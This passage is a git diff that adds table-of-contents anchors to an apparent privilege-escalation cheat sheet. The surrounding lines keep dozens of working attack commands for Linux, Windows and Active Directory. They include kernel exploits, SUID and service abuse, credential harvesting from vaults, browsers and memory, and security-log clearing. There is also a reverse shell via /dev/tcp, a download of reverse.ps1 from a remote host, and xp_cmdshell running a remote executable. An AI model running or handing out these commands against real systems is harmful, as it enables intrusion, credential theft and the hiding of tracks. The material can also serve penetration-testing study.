@@ -1,5 +1,165 @@
+<!-- TOC start -->
+- [DirtyC0w](#dirtyc0w)
+- [CVE-2016-1531](#cve-2016-1531)
+- [Polkit](#polkit)
+- [DirtyPipe](#dirtypipe)
+- [PwnKit](#pwnkit)
+- [ms14_058](#ms14_058)
+- [Hot Potato](#hot-potato)
+- [Intel SYSRET](#intel-sysret)
+- [PrintNightmare](#printnightmare)
+- [Folina](#folina)
+- [ALPC](#alpc)
+- [RemotePotato0](#remotepotato0)
+- [CVE-2022-26923](#cve-2022-26923)
+- [MS14-068](#ms14-068)
+- [Sudo LD_PRELOAD](#sudo-ld_preload)
+- [Abusing File Permission via SUID Binaries - .so injection) ](#abusing-file-permission-via-suid-binaries-so-injection)
+- [DLL Injection](#dll-injection)
+- [Early Bird Injection](#early-bird-injection)
+- [Process Injection through Memory Section](#process-injection-through-memory-section)
+- [Abusing Scheduled Tasks via Cron Path Overwrite](#abusing-scheduled-tasks-via-cron-path-overwrite)
+- [Abusing Scheduled Tasks via Cron Wildcards](#abusing-scheduled-tasks-via-cron-wildcards)
+- [Abusing File Permission via SUID Binaries - Symlink) ](#abusing-file-permission-via-suid-binaries-symlink)
+- [Abusing File Permission via SUID Binaries - Environment Variables \#1) ](#abusing-file-permission-via-suid-binaries-environment-variables-1)
+- [Abusing File Permission via SUID Binaries - Environment Variables \#2) ](#abusing-file-permission-via-suid-binaries-environment-variables-2)
+- [DLL Hijacking](#dll-hijacking)
+- [Abusing Services via binPath](#abusing-services-via-binpath)
+- [Abusing Services via Unquoted Path](#abusing-services-via-unquoted-path)
+- [Abusing Services via Registry](#abusing-services-via-registry)
+- [Abusing Services via Executable File](#abusing-services-via-executable-file)
+- [Abusing Services via Autorun](#abusing-services-via-autorun)
+- [Abusing Services via AlwaysInstallElevated](#abusing-services-via-alwaysinstallelevated)
+- [Abusing Services via SeCreateToken](#abusing-services-via-secreatetoken)
+- [Abusing Services via SeDebug](#abusing-services-via-sedebug)
+- [Remote Process via Syscalls (HellsGate\|HalosGate)](#remote-process-via-syscalls-hellsgatehalosgate)
+- [Escalate With DuplicateTokenEx](#escalate-with-duplicatetokenex)
+- [Abusing Services via SeIncreaseBasePriority](#abusing-services-via-seincreasebasepriority)
+- [Abusing Services via SeManageVolume](#abusing-services-via-semanagevolume)
+- [Abusing Services via SeRelabel](#abusing-services-via-serelabel)
+- [Abusing Services via SeRestore](#abusing-services-via-serestore)
+- [Abuse via SeBackup](#abuse-via-sebackup)
+- [Abusing via SeCreatePagefile](#abusing-via-secreatepagefile)
+- [Abusing via SeSystemEnvironment ](#abusing-via-sesystemenvironment)
+- [Abusing via SeTakeOwnership ](#abusing-via-setakeownership)
+- [Abusing via SeTcb ](#abusing-via-setcb)
+- [Abusing via SeTrustedCredManAccess ](#abusing-via-setrustedcredmanaccess)
+- [Abusing tokens via SeAssignPrimaryToken](#abusing-tokens-via-seassignprimarytoken)
+- [Abusing via SeCreatePagefile](#abusing-via-secreatepagefile-1)
+- [Certificate Abuse](#certificate-abuse)
+- [Password Mining in Memory](#password-mining-in-memory)
+- [Password Mining in Memory](#password-mining-in-memory-1)
+- [Password Mining in Registry](#password-mining-in-registry)
+- [Password Mining in General Events via SeAudit](#password-mining-in-general-events-via-seaudit)
+- [Password Mining in Security Events via SeSecurity](#password-mining-in-security-events-via-sesecurity)
+- [Startup Applications](#startup-applications)
+- [Password Mining in McAfeeSitelistFiles](#password-mining-in-mcafeesitelistfiles)
+- [Password Mining in CachedGPPPassword](#password-mining-in-cachedgpppassword)
+- [Password Mining in DomainGPPPassword](#password-mining-in-domaingpppassword)
+- [Password Mining in KeePass](#password-mining-in-keepass)
+- [Password Mining in WindowsVault](#password-mining-in-windowsvault)
+- [Password Mining in SecPackageCreds](#password-mining-in-secpackagecreds)
+- [Password Mining in PuttyHostKeys](#password-mining-in-puttyhostkeys)
+- [Password Mining in RDCManFiles](#password-mining-in-rdcmanfiles)
+- [Password Mining in RDPSavedConnections](#password-mining-in-rdpsavedconnections)
+- [Password Mining in MasterKeys](#password-mining-in-masterkeys)
+- [Password Mining in Browsers](#password-mining-in-browsers)
+- [Password Mining in Files](#password-mining-in-files)
+- [Password Mining in LDAP](#password-mining-in-ldap)
+- [Password Mining in Clipboard](#password-mining-in-clipboard)
+- [Password Mining in GMSA Password](#password-mining-in-gmsa-password)
+- [Delegate tokens via RDP](#delegate-tokens-via-rdp)
+- [Delegate tokens via FTP](#delegate-tokens-via-ftp)
+- [Fake Logon Screen](#fake-logon-screen)
+- [Abusing WinRM Services](#abusing-winrm-services)
+- [Abusing Sudo Binaries](#abusing-sudo-binaries)
+- [Abusing Scheduled Tasks](#abusing-scheduled-tasks)
+- [Golden Ticket With Scheduled Tasks](#golden-ticket-with-scheduled-tasks)
+- [Abusing Interpreter Capabilities](#abusing-interpreter-capabilities)
+- [Abusing Binary Capabilities](#abusing-binary-capabilities)
+- [Abusing ActiveSessions Capabilities](#abusing-activesessions-capabilities)
+- [Escalate with TRUSTWORTHY in SQL Server](#escalate-with-trustworthy-in-sql-server)
+- [Abusing Mysql run as root](#abusing-mysql-run-as-root)
+- [Abusing journalctl](#abusing-journalctl)
+- [Abusing VDS](#abusing-vds)
+- [Abusing Browser](#abusing-browser)
+- [Abusing LDAP](#abusing-ldap)
+- [LLMNR Poisoning](#llmnr-poisoning)
+- [Abusing Certificate Services](#abusing-certificate-services)
+- [MySQL UDF Code Injection](#mysql-udf-code-injection)
+- [Impersonation Token with ImpersonateLoggedOnuser](#impersonation-token-with-impersonateloggedonuser)
+- [Impersonation Token with SeImpersontePrivilege](#impersonation-token-with-seimpersonteprivilege)
+- [Impersonation Token with SeLoadDriverPrivilege](#impersonation-token-with-seloaddriverprivilege)
+- [OpenVPN Credentials](#openvpn-credentials)
+- [Bash History](#bash-history)
+- [Package Capture](#package-capture)
+- [NFS Root Squashing](#nfs-root-squashing)
+- [Abusing Access Control List](#abusing-access-control-list)
+- [Escalate With SeBackupPrivilege](#escalate-with-sebackupprivilege)
+- [Escalate With SeImpersonatePrivilege](#escalate-with-seimpersonateprivilege)
+- [Escalate With SeLoadDriverPrivilege](#escalate-with-seloaddriverprivilege)
+- [Escalate With ForceChangePassword](#escalate-with-forcechangepassword)
+- [Escalate With GenericWrite](#escalate-with-genericwrite)
+- [Abusing GPO](#abusing-gpo)
+- [Pass-the-Ticket](#pass-the-ticket)
+- [Golden Ticket](#golden-ticket)
+- [Abusing Splunk Universal Forwarder](#abusing-splunk-universal-forwarder)
+- [Abusing Gdbus](#abusing-gdbus)
+- [Abusing Trusted DC](#abusing-trusted-dc)
+- [NTLM Relay ](#ntlm-relay)
+- [Exchange Relay ](#exchange-relay)
+- [Dumping with diskshadow](#dumping-with-diskshadow)
+- [Dumping with vssadmin](#dumping-with-vssadmin)
+- [Password Spraying](#password-spraying)
+- [AS-REP Roasting](#as-rep-roasting)
+- [Kerberoasting](#kerberoasting)
+- [Dump lsass with SilentProcessExit](#dump-lsass-with-silentprocessexit)
+- [Lsass Shtinkering](#lsass-shtinkering)
+- [AndrewSpecial](#andrewspecial)
+- [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
+- [CCACHE ticket reuse from keyring](#ccache-ticket-reuse-from-keyring)
+- [CCACHE ticket reuse from SSSD KCM](#ccache-ticket-reuse-from-sssd-kcm)
+- [CCACHE ticket reuse from keytab](#ccache-ticket-reuse-from-keytab)
+- [SSH Forwarder](#ssh-forwarder)
+- [DLL Search Order Hijacking](#dll-search-order-hijacking)
+- [Slui File Handler Hijack LPE](#slui-file-handler-hijack-lpe)
+- [CDPSvc DLL Hijacking](#cdpsvc-dll-hijacking)
+- [Magnify.exe Dll Search Order Hijacking](#magnifyexe-dll-search-order-hijacking)
+- [CdpSvc Service ](#cdpsvc-service)
+- [HiveNightmare](#hivenightmare)
+- [Abusing with FileRestorePrivilege](#abusing-with-filerestoreprivilege)
+- [Abusing with RestoreAndBackupPrivileges](#abusing-with-restoreandbackupprivileges)
+- [Abusing with ShadowCopyBackupPrivilege](#abusing-with-shadowcopybackupprivilege)
+- [Abusing with ShadowCopy](#abusing-with-shadowcopy)
+- [Dynamic Phishing](#dynamic-phishing)
+- [Race Conditions](#race-conditions)
+- [Abusing usermode helper API](#abusing-usermode-helper-api)
+- [Escape only with CAP_SYS_ADMIN capability](#escape-only-with-cap_sys_admin-capability)
+- [Abusing exposed host directories](#abusing-exposed-host-directories)
+- [Unix Wildcard](#unix-wildcard)
+- [Socket Command Injection](#socket-command-injection)
+- [Logstash](#logstash)
+- [UsoDllLoader](#usodllloader)
+- [Trend Chain Methods for Privilege Escalation ](#trend-chain-methods-for-privilege-escalation)
+- [Habanero Chilli](#habanero-chilli)
+- [Padron Chilli](#padron-chilli)
+- [Jalapeno Chillies](#jalapeno-chillies)
+- [Pasilla Chili](#pasilla-chili)
+- [Finger Chilli](#finger-chilli)
+- [Orange Cayenne](#orange-cayenne)
+- [Red Cayenne](#red-cayenne)
+- [Birds Eye Chilli](#birds-eye-chilli)
+- [Scotch Bonnet](#scotch-bonnet)
+- [Lemon Habanero](#lemon-habanero)
+- [Red Habanero](#red-habanero)
+- [Ghost Pepper](#ghost-pepper)
+- [Chocolate Scorpion Chilli](#chocolate-scorpion-chilli)
+- [Carolina Reaper](#carolina-reaper)
+- [The Intimidator Chilli](#the-intimidator-chilli)
+<!-- TOC end -->
 Methods for Privilege Escalation
 
+<!-- TOC --><a name="dirtyc0w"></a>
 # DirtyC0w
 
 Domain: No
@@ -14,6 +174,7 @@ Methods:
 
 1.  gcc -pthread c0w.c -o c0w; ./c0w; passwd; id
 
+<!-- TOC --><a name="cve-2016-1531"></a>
 # CVE-2016-1531
 
 Domain: No
@@ -28,6 +189,7 @@ Methods:
 
 2.  CVE-2016-1531.sh;id
 
+<!-- TOC --><a name="polkit"></a>
 # Polkit
 
 Domain: No
@@ -48,6 +210,7 @@ https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
 
 poc.sh
 
+<!-- TOC --><a name="dirtypipe"></a>
 # DirtyPipe
 
 Domain: No
@@ -68,6 +231,7 @@ Methods:
 
 Whoami;id
 
+<!-- TOC --><a name="pwnkit"></a>
 # PwnKit
 
 Domain: No
@@ -88,6 +252,7 @@ Methods:
 
 Whoami;id
 
+<!-- TOC --><a name="ms14_058"></a>
 # ms14_058
 
 Domain: No
@@ -106,6 +271,7 @@ msf exploit(ms14_058_track_popup_menu) \> set TARGET \< target-id \>
 
 msf exploit(ms14_058_track_popup_menu) \> exploit
 
+<!-- TOC --><a name="hot-potato"></a>
 # Hot Potato
 
 Domain: No
@@ -140,6 +306,7 @@ To confirm that the attack was successful, in Power Shell prompt type:
 
 net localgroup administrators
 
+<!-- TOC --><a name="intel-sysret"></a>
 # Intel SYSRET
 
 Domain: No
@@ -156,6 +323,7 @@ Methods:
 
 execute -H -f sysret.exe -a \"-pid \[pid\]"
 
+<!-- TOC --><a name="printnightmare"></a>
 # PrintNightmare
 
 Domain: Yes
@@ -176,6 +344,7 @@ https://github.com/outflanknl/PrintNightmare
 
 PrintNightmare 10.10.10.10 exp.dll
 
+<!-- TOC --><a name="folina"></a>
 # Folina
 
 Domain: Y/N
@@ -196,6 +365,7 @@ https://github.com/JohnHammond/msdt-follina
 
 python3 follina.py -c \"notepad\"
 
+<!-- TOC --><a name="alpc"></a>
 # ALPC
 
 Domain: Y/N
@@ -212,6 +382,7 @@ Methods:
 
 https://github.com/riparino/Task_Scheduler_ALPC
 
+<!-- TOC --><a name="remotepotato0"></a>
 # RemotePotato0
 
 Domain: Y/N
@@ -233,6 +404,7 @@ normal_user
 
 .\\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1
 
+<!-- TOC --><a name="cve-2022-26923"></a>
 # CVE-2022-26923
 
 Domain: Y/N
@@ -256,6 +428,7 @@ Rubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx
 /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\"
 /dc:\"DOMAIN_CONTROLLER\" /show
 
+<!-- TOC --><a name="ms14-068"></a>
 # MS14-068
 
 Domain: Y/N
@@ -273,6 +446,7 @@ Methods:
 python ms14-068.py -u user-a-1\@dom-a.loc -s
 S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc
 
+<!-- TOC --><a name="sudo-ld_preload"></a>
 # Sudo LD_PRELOAD
 
 Domain: No
@@ -315,6 +489,7 @@ sudo LD_RELOAD=tmp/ldreload.so apache2
 
 id
 
+<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-so-injection"></a>
 # Abusing File Permission via SUID Binaries - .so injection) 
 
 Domain: No
@@ -359,6 +534,7 @@ gcc -shared -o /home/user/.config/libcalc.so
 
 id
 
+<!-- TOC --><a name="dll-injection"></a>
 # DLL Injection
 
 Domain: No
@@ -395,6 +571,7 @@ Or
 
 mandllinjection ./runforpriv.dll pid
 
+<!-- TOC --><a name="early-bird-injection"></a>
 # Early Bird Injection
 
 Domain: No
@@ -411,6 +588,7 @@ Methods:
 
 hollow svchost.exe pop.bin
 
+<!-- TOC --><a name="process-injection-through-memory-section"></a>
 # Process Injection through Memory Section
 
 Domain: No
@@ -427,6 +605,7 @@ Methods:
 
 sec-shinject PID /path/to/bin
 
+<!-- TOC --><a name="abusing-scheduled-tasks-via-cron-path-overwrite"></a>
 # Abusing Scheduled Tasks via Cron Path Overwrite
 
 Domain: No
@@ -450,6 +629,7 @@ Methods:
 
 5.  id && whoami
 
+<!-- TOC --><a name="abusing-scheduled-tasks-via-cron-wildcards"></a>
 # Abusing Scheduled Tasks via Cron Wildcards
 
 Domain: No
@@ -475,6 +655,7 @@ Methods:
 
 11. id && whoami
 
+<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-symlink"></a>
 # Abusing File Permission via SUID Binaries - Symlink) 
 
 Domain: No
@@ -501,6 +682,7 @@ In root user
 
 invoke-rc.d nginx rotate \>/dev/null 2\>&1
 
+<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-environment-variables-1"></a>
 # Abusing File Permission via SUID Binaries - Environment Variables \#1) 
 
 Domain: No
@@ -530,6 +712,7 @@ export PATH=/tmp:\$PATH;
 
 /usr/local/bin/sudi-env; id
 
+<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-environment-variables-2"></a>
 # Abusing File Permission via SUID Binaries - Environment Variables \#2) 
 
 Domain: No
@@ -548,6 +731,7 @@ env -i SHELLOPTS=xtrace PS4=\'\$(cp /bin/bash /tmp && chown root.root
 /tmp/bash && chmod +S /tmp/bash)\' /bin/sh -c /usr/local/bin/suid-env2;
 set +x; /tmp/bash -p\'
 
+<!-- TOC --><a name="dll-hijacking"></a>
 # DLL Hijacking
 
 Domain: No
@@ -574,6 +758,7 @@ x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
 
 sc stop dllsvc & sc start dllsvc
 
+<!-- TOC --><a name="abusing-services-via-binpath"></a>
 # Abusing Services via binPath
 
 Domain: No
@@ -594,6 +779,7 @@ sc config daclsvc binpath= \"net localgroup administrators user /add\"
 
 sc start daclsvc
 
+<!-- TOC --><a name="abusing-services-via-unquoted-path"></a>
 # Abusing Services via Unquoted Path
 
 Domain: No
@@ -621,6 +807,7 @@ Place common.exe in 'C:\\Program Files\\Unquoted Path Service'.
 
 sc start unquotedsvc
 
+<!-- TOC --><a name="abusing-services-via-registry"></a>
 # Abusing Services via Registry
 
 Domain: No
@@ -644,6 +831,7 @@ REG_EXPAND_SZ /d c:\\temp\\x.exe /f
 
 sc start regsvc
 
+<!-- TOC --><a name="abusing-services-via-executable-file"></a>
 # Abusing Services via Executable File
 
 Domain: No
@@ -665,6 +853,7 @@ Service\\filepermservice.exe\"
 
 sc start filepermsvc
 
+<!-- TOC --><a name="abusing-services-via-autorun"></a>
 # Abusing Services via Autorun
 
 Domain: No
@@ -699,6 +888,7 @@ program.exe
 
 Place program.exe in 'C:\\Program Files\\Autorun Program'.
 
+<!-- TOC --><a name="abusing-services-via-alwaysinstallelevated"></a>
 # Abusing Services via AlwaysInstallElevated
 
 Domain: No
@@ -725,6 +915,7 @@ Or
 
 SharpUp.exe AlwaysInstallElevated
 
+<!-- TOC --><a name="abusing-services-via-secreatetoken"></a>
 # Abusing Services via SeCreateToken
 
 Domain: No
@@ -745,6 +936,7 @@ Methods:
 
 !rmpriv
 
+<!-- TOC --><a name="abusing-services-via-sedebug"></a>
 # Abusing Services via SeDebug
 
 Domain: No
@@ -765,6 +957,7 @@ Or
 
 syscall_enable_priv 20
 
+<!-- TOC --><a name="remote-process-via-syscalls-hellsgatehalosgate"></a>
 # Remote Process via Syscalls (HellsGate\|HalosGate)
 
 Domain: No
@@ -781,6 +974,7 @@ Methods:
 
 injectEtwBypass pid
 
+<!-- TOC --><a name="escalate-with-duplicatetokenex"></a>
 # Escalate With DuplicateTokenEx
 
 Domain: Yes
@@ -799,6 +993,7 @@ Or
 
 TokenPlaye.exe \--impersonate \--pid pid
 
+<!-- TOC --><a name="abusing-services-via-seincreasebasepriority"></a>
 # Abusing Services via SeIncreaseBasePriority
 
 Domain: No
@@ -815,6 +1010,7 @@ Methods:
 
 start /realtime SomeCpuIntensiveApp.exe
 
+<!-- TOC --><a name="abusing-services-via-semanagevolume"></a>
 # Abusing Services via SeManageVolume
 
 Domain: No
@@ -831,6 +1027,7 @@ Methods:
 
 Just only compile and run SeManageVolumeAbuse
 
+<!-- TOC --><a name="abusing-services-via-serelabel"></a>
 # Abusing Services via SeRelabel
 
 Domain: No
@@ -851,6 +1048,7 @@ WRITE_OWNER access to a resource, including files and folders.
 
 Run for privilege escalation
 
+<!-- TOC --><a name="abusing-services-via-serestore"></a>
 # Abusing Services via SeRestore
 
 Domain: No
@@ -873,6 +1071,7 @@ Methods:
 
 5\. Lock the console and press Win+U
 
+<!-- TOC --><a name="abuse-via-sebackup"></a>
 # Abuse via SeBackup
 
 Domain: No
@@ -909,6 +1108,7 @@ Select the Copy the Base64 encoded string.
 
 In command prompt type: echo -ne \[Base64 String\] \| base64 -d
 
+<!-- TOC --><a name="abusing-via-secreatepagefile"></a>
 # Abusing via SeCreatePagefile
 
 Domain: No
@@ -926,6 +1126,7 @@ Methods:
 HIBR2BIN /PLATFORM X64 /MAJOR 6 /MINOR 1 /INPUT hiberfil.sys /OUTPUT
 uncompressed.bin
 
+<!-- TOC --><a name="abusing-via-sesystemenvironment"></a>
 # Abusing via SeSystemEnvironment 
 
 Domain: No
@@ -946,6 +1147,7 @@ Methods:
 
 TrustExec.exe -m exec -c \"whoami /priv\" -f
 
+<!-- TOC --><a name="abusing-via-setakeownership"></a>
 # Abusing via SeTakeOwnership 
 
 Domain: No
@@ -966,6 +1168,7 @@ Methods:
 
 4\. Lock the console and press Win+U
 
+<!-- TOC --><a name="abusing-via-setcb"></a>
 # Abusing via SeTcb 
 
 Domain: No
@@ -990,6 +1193,7 @@ PrivFu
 
 psexec.exe -i -s -d cmd.exe
 
+<!-- TOC --><a name="abusing-via-setrustedcredmanaccess"></a>
 # Abusing via SeTrustedCredManAccess 
 
 Domain: No
@@ -1014,6 +1218,7 @@ CredManBOF
 
 TrustExec.exe -m exec -c \"whoami /priv\" -f
 
+<!-- TOC --><a name="abusing-tokens-via-seassignprimarytoken"></a>
 # Abusing tokens via SeAssignPrimaryToken
 
 Domain: No
@@ -1036,6 +1241,7 @@ https://github.com/decoder-it/juicy_2
 
 https://github.com/antonioCoco/RoguePotato
 
+<!-- TOC --><a name="abusing-via-secreatepagefile-1"></a>
 # Abusing via SeCreatePagefile
 
 Domain: No
@@ -1060,6 +1266,7 @@ Or
 
 invoke-module LogCleaner.ps1
 
+<!-- TOC --><a name="certificate-abuse"></a>
 # Certificate Abuse
 
 Domain: Yes
@@ -1081,6 +1288,7 @@ ceritify.exe request /ca:dc.domain.local\\DC-CA /template:User...
 Rubeus.exe asktgy /user:CORP\\itadmin /certificate:C:\\cert.pfx
 /password:password
 
+<!-- TOC --><a name="password-mining-in-memory"></a>
 # Password Mining in Memory
 
 Domain: No
@@ -1107,6 +1315,7 @@ Methods:
 
 9.  strings /tmp/mem \| grep passw
 
+<!-- TOC --><a name="password-mining-in-memory-1"></a>
 # Password Mining in Memory
 
 Domain: No
@@ -1143,6 +1352,7 @@ Select the Copy the Base64 encoded string.
 
 In command prompt type: echo -ne \[Base64 String\] \| base64 -d
 
+<!-- TOC --><a name="password-mining-in-registry"></a>
 # Password Mining in Registry
 
 Domain: No
@@ -1221,6 +1431,7 @@ Password\]
 
 From the output, make note of the credentials.
 
+<!-- TOC --><a name="password-mining-in-general-events-via-seaudit"></a>
 # Password Mining in General Events via SeAudit
 
 Domain: No
@@ -1245,6 +1456,7 @@ Or
 
 invoke-module LogCleaner.ps1
 
+<!-- TOC --><a name="password-mining-in-security-events-via-sesecurity"></a>
 # Password Mining in Security Events via SeSecurity
 
 Domain: No
@@ -1269,6 +1481,7 @@ Or
 
 wevtutil cl Security
 
+<!-- TOC --><a name="startup-applications"></a>
 # Startup Applications
 
 Domain: No
@@ -1304,6 +1517,7 @@ x.exe
 Place x.exe in "C:\\ProgramData\\Microsoft\\Windows\\Start
 Menu\\Programs\\Startup".
 
+<!-- TOC --><a name="password-mining-in-mcafeesitelistfiles"></a>
 # Password Mining in McAfeeSitelistFiles
 
 Domain: No
@@ -1320,6 +1534,7 @@ Methods:
 
 SharpUp.exe McAfeeSitelistFiles
 
+<!-- TOC --><a name="password-mining-in-cachedgpppassword"></a>
 # Password Mining in CachedGPPPassword
 
 Domain: Y/N
@@ -1336,6 +1551,7 @@ Methods:
 
 SharpUp.exe CachedGPPPassword
 
+<!-- TOC --><a name="password-mining-in-domaingpppassword"></a>
 # Password Mining in DomainGPPPassword
 
 Domain: No
@@ -1352,6 +1568,7 @@ Methods:
 
 SharpUp.exe DomainGPPPassword
 
+<!-- TOC --><a name="password-mining-in-keepass"></a>
 # Password Mining in KeePass
 
 Domain: No
@@ -1372,6 +1589,7 @@ Or
 
 KeeTheft.exe
 
+<!-- TOC --><a name="password-mining-in-windowsvault"></a>
 # Password Mining in WindowsVault
 
 Domain: No
@@ -1388,6 +1606,7 @@ Methods:
 
 Seatbelt.exe WindowsVault
 
+<!-- TOC --><a name="password-mining-in-secpackagecreds"></a>
 # Password Mining in SecPackageCreds
 
 Domain: No
@@ -1404,6 +1623,7 @@ Methods:
 
 Seatbelt.exe SecPackageCreds
 
+<!-- TOC --><a name="password-mining-in-puttyhostkeys"></a>
 # Password Mining in PuttyHostKeys
 
 Domain: No
@@ -1420,6 +1640,7 @@ Methods:
 
 Seatbelt.exe PuttyHostKeys
 
+<!-- TOC --><a name="password-mining-in-rdcmanfiles"></a>
 # Password Mining in RDCManFiles
 
 Domain: No
@@ -1436,6 +1657,7 @@ Methods:
 
 Seatbelt.exe RDCManFiles
 
+<!-- TOC --><a name="password-mining-in-rdpsavedconnections"></a>
 # Password Mining in RDPSavedConnections
 
 Domain: No
@@ -1452,6 +1674,7 @@ Methods:
 
 Seatbelt.exe RDPSavedConnections
 
+<!-- TOC --><a name="password-mining-in-masterkeys"></a>
 # Password Mining in MasterKeys
 
 Domain: No
@@ -1468,6 +1691,7 @@ Methods:
 
 SharpDPAPI masterkeys
 
+<!-- TOC --><a name="password-mining-in-browsers"></a>
 # Password Mining in Browsers
 
 Domain: No
@@ -1484,6 +1708,7 @@ Methods:
 
 SharpWeb.exe all
 
+<!-- TOC --><a name="password-mining-in-files"></a>
 # Password Mining in Files
 
 Domain: No
@@ -1501,6 +1726,7 @@ Methods:
 SauronEye.exe -d C:\\Users\\vincent\\Desktop\\ \--filetypes .txt .doc
 .docx .xls \--contents \--keywords password pass\* -v\`
 
+<!-- TOC --><a name="password-mining-in-ldap"></a>
 # Password Mining in LDAP
 
 Domain: No
@@ -1525,6 +1751,7 @@ Import-Module .\\PowerView.ps1
 Get-DomainComputer COMPUTER -Properties
 ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
 
+<!-- TOC --><a name="password-mining-in-clipboard"></a>
 # Password Mining in Clipboard
 
 Domain: No
@@ -1541,6 +1768,7 @@ Methods:
 
 execute-assembly /root/SharpClipHistory.exe
 
+<!-- TOC --><a name="password-mining-in-gmsa-password"></a>
 # Password Mining in GMSA Password
 
 Domain: No
@@ -1557,6 +1785,7 @@ Methods:
 
 GMSAPasswordReader.exe \--accountname SVC_SERVICE_ACCOUNT
 
+<!-- TOC --><a name="delegate-tokens-via-rdp"></a>
 # Delegate tokens via RDP
 
 Domain: No
@@ -1577,6 +1806,7 @@ Or
 
 pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem
 
+<!-- TOC --><a name="delegate-tokens-via-ftp"></a>
 # Delegate tokens via FTP
 
 Domain: No
@@ -1609,6 +1839,7 @@ fakeFtpServer.setFileSystem(fileSystem);
 
 fakeFtpServer.start();
 
+<!-- TOC --><a name="fake-logon-screen"></a>
 # Fake Logon Screen
 
 Domain: No
@@ -1625,6 +1856,7 @@ Methods:
 
 execute-assembly fakelogonscreen.exe
 
+<!-- TOC --><a name="abusing-winrm-services"></a>
 # Abusing WinRM Services
 
 Domain: No
@@ -1642,6 +1874,7 @@ Methods:
 RogueWinRM.exe -p C:\\windows\\system32\\cmd.exe
 
 
+<!-- TOC --><a name="abusing-sudo-binaries"></a>
 # Abusing Sudo Binaries
 
 Domain: No
@@ -1713,6 +1946,7 @@ Methods:
 28. sudo apache2 -f /etc/shadow\
     > john hash \--wordlist=/usr/share/wordlists/rockyou.txt
 
+<!-- TOC --><a name="abusing-scheduled-tasks"></a>
 # Abusing Scheduled Tasks
 
 Domain: Y/N
@@ -1735,6 +1969,7 @@ Methods:
 
 5.  id && whoami
 
+<!-- TOC --><a name="golden-ticket-with-scheduled-tasks"></a>
 # Golden Ticket With Scheduled Tasks
 
 Domain: Yes
@@ -1765,6 +2000,7 @@ http://10.10.10.10/reverse.ps1)\'"
 
 7.schtasks /run /s DOMAIN /TN \"enterprise"
 
+<!-- TOC --><a name="abusing-interpreter-capabilities"></a>
 # Abusing Interpreter Capabilities
 
 Domain: No
@@ -1795,6 +2031,7 @@ Methods:
 
     c.  id && whoami
 
+<!-- TOC --><a name="abusing-binary-capabilities"></a>
 # Abusing Binary Capabilities
 
 Domain: No
@@ -1821,6 +2058,7 @@ Methods:
 
     b.  id && whoami
 
+<!-- TOC --><a name="abusing-activesessions-capabilities"></a>
 # Abusing ActiveSessions Capabilities
 
 Domain: No
@@ -1840,6 +2078,7 @@ https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source
 Invoke-SQLOCmd -Verbose -Command "net localgroup administrators user1
 /add" -Instance COMPUTERNAME
 
+<!-- TOC --><a name="escalate-with-trustworthy-in-sql-server"></a>
 # Escalate with TRUSTWORTHY in SQL Server
 
 Domain: Yes
@@ -1888,6 +2127,7 @@ execute(\'sp_configure \"xp_cmdshell\",1;RECONFIGURE\') at
 execute(\'exec master..xp_cmdshell \"\\\\10.10.10.10\\reverse.exe\"\')
 at \"\<DOMAIN\>\\\<DATABASE NAME\>\"
 
+<!-- TOC --><a name="abusing-mysql-run-as-root"></a>
 # Abusing Mysql run as root
 
 Domain: Yes
@@ -1912,6 +2152,7 @@ Methods:
 >
 > id && whoami
 
+<!-- TOC --><a name="abusing-journalctl"></a>
 # Abusing journalctl
 
 Domain: No
@@ -1928,6 +2169,7 @@ Methods:
 
 -   !/bin/sh
 
+<!-- TOC --><a name="abusing-vds"></a>
 # Abusing VDS
 
 Domain: No
@@ -1944,6 +2186,7 @@ Methods:
 
 Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\\user1'
 
+<!-- TOC --><a name="abusing-browser"></a>
 # Abusing Browser
 
 Domain: No
@@ -1960,6 +2203,7 @@ Methods:
 
 Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\\user1'
 
+<!-- TOC --><a name="abusing-ldap"></a>
 # Abusing LDAP
 
 Domain: Yes
@@ -2030,6 +2274,7 @@ replace: EVIL USER ID
 
 gidNumber: CURRENT GROUP ID
 
+<!-- TOC --><a name="llmnr-poisoning"></a>
 # LLMNR Poisoning
 
 Domain: Yes
@@ -2054,6 +2299,7 @@ IconIndex=0
 
 IconFile=\\\\attacker_ip\\not_found.ico
 
+<!-- TOC --><a name="abusing-certificate-services"></a>
 # Abusing Certificate Services
 
 Domain: Yes
@@ -2081,6 +2327,7 @@ adcspwn.exe \--adcs cs.pwnlab.local \--remote dc.pwnlab.local
 \--username pwnlab.local\\mranderson \--password The0nly0ne! \--dc
 dc.pwnlab.local
 
+<!-- TOC --><a name="mysql-udf-code-injection"></a>
 # MySQL UDF Code Injection
 
 Domain: Yes
@@ -2111,6 +2358,7 @@ mysql\> create function sys_exec returns integer soname
 mysql\> select sys_exec(\'bash -i \>& /dev/tcp/10.10.10.10/9999
 0\>&1\');
 
+<!-- TOC --><a name="impersonation-token-with-impersonateloggedonuser"></a>
 # Impersonation Token with ImpersonateLoggedOnuser
 
 Domain: No
@@ -2129,6 +2377,7 @@ Methods:
 
 # 
 
+<!-- TOC --><a name="impersonation-token-with-seimpersonteprivilege"></a>
 # Impersonation Token with SeImpersontePrivilege
 
 Domain: No
@@ -2145,6 +2394,7 @@ Methods:
 
 # 
 
+<!-- TOC --><a name="impersonation-token-with-seloaddriverprivilege"></a>
 # Impersonation Token with SeLoadDriverPrivilege
 
 Domain: No
@@ -2160,6 +2410,7 @@ Methods:
 1.EOPLOADDRIVER.exe System\\\\CurrentControlSet\\\\MyService
 C:\\\\Users\\\\Username\\\\Desktop\\\\Driver.sys
 
+<!-- TOC --><a name="openvpn-credentials"></a>
 # OpenVPN Credentials
 
